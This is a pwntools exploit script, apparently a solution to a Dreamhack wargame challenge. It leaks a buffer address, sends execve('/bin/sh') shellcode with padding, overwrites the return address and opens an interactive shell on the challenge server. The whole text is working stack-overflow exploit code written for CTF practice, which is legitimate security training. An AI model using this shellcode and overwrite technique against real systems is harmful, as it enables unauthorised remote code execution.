from pwn import *

p = remote("host1.dreamhack.games",18079)           # make connection

p.recvuntil(b'buf = (')                             # I'll receive but not save (to variable)
addr = int(p.recv(10), 16)                          # I'll receive 10 characters-length hexadecimal(16) value

code = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'  # 26 byte shellcode

code += b'\x80' * 106               # 26 + 106 = 132(bytes)

# overwrite return(retn) address
code += p32(addr)                   # ADDRESS INSERT

p.send(code)                        # send code
p.interactive()                     # keep connection alive
